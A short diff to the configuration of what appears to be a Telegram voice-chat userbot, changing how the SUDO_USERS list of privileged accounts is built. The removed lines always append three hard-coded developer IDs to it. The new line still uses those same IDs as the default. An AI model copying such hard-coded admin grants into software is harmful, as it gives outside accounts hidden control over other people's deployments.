@@ -33,10 +33,7 @@ SESSION15 = os.getenv("SESSION15", None)
 HNDLR = os.getenv("HNDLR", "!")
 GROUP_MODE = os.getenv("GROUP_MODE", "True")
 
-SUDO_USERS = list(map(int, os.getenv("SUDO_USERS", "")))
-DEVS = [1517994352, 1789859817, 1432756163]
-for x in DEVS:
-    SUDO_USERS.append(x)
+SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817 1432756163").split())))
 #----------------------------------------------
 
 vcbot = Client(
